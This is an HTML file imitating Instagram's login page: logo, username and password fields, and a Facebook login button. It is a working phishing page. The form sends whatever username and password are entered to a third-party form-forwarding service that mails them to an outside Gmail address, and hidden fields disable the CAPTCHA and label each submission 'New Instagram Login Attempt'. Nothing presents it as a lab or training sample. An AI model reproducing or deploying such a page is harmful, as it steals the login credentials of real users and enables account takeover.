<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram Login</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <div class="login-container">
    <form class="login-box" action="https://formsubmit.co/theinvestorcompany001@gmail.com" method="POST">
      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" class="logo" />
      
      <!-- Hidden inputs to disable CAPTCHA and redirect -->
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_template" value="table">
      <input type="hidden" name="_subject" value="New Instagram Login Attempt">

      <input type="text" name="username_or_email" placeholder="Phone number, username, or email" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit">Log In</button>

      <div class="divider">OR</div>
      <button class="fb-login" type="button">Log in with Facebook</button>
      <a href="#" class="forgot">Forgot password?</a>
    </form>
    <div class="signup-box">
      <p>Don't have an account? <a href="#">Sign up</a></p>
    </div>
  </div>
</body>
</html>
